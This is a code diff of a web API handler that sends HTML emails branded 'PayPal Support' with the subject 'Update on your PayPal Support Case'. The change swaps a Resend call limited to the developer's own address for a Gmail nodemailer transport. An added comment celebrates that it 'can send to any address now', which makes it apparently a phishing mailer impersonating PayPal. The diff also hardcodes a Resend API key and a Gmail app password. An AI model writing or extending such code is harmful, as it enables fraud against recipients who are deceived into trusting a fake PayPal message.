@@ -1,3 +1,5 @@
+import nodemailer from 'nodemailer';
+
 export default async function handler(req, res) {
   if (req.method !== 'POST') {
     return res.status(405).json({ error: 'Method not allowed' });
@@ -36,27 +38,24 @@ export default async function handler(req, res) {
   `;
 
   try {
-    const response = await fetch('https://api.resend.com/emails', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-        'Authorization': 'Bearer re_8HBkCqtU_GNf2BqKfohtaQzLra2cxuYkq'
-      },
-      body: JSON.stringify({
-        from: 'PayPal Support <onboarding@resend.dev>',
-        to: email, // Note: Since the Resend domain is unverified, this will ONLY send successfully if the 'email' is the exact email address you signed up for Resend with (bryanjoe0012@gmail.com).
-        subject: 'Update on your PayPal Support Case',
-        html: htmlContent
-      })
+    const transporter = nodemailer.createTransport({
+      service: 'gmail',
+      auth: {
+        user: 'paypalsmartsupsupport@gmail.com',
+        pass: 'xiiy kxje obxc mrem'
+      }
     });
 
-    const data = await response.json();
-    if (response.ok) {
-      res.status(200).json(data);
-    } else {
-      res.status(400).json(data);
-    }
+    const info = await transporter.sendMail({
+      from: '"PayPal Support" <paypalsmartsupsupport@gmail.com>',
+      to: email, // Can send to any address now!
+      subject: 'Update on your PayPal Support Case',
+      html: htmlContent
+    });
+
+    res.status(200).json({ success: true, messageId: info.messageId });
   } catch (error) {
+    console.error("Nodemailer error:", error);
     res.status(500).json({ error: error.message });
   }
 }
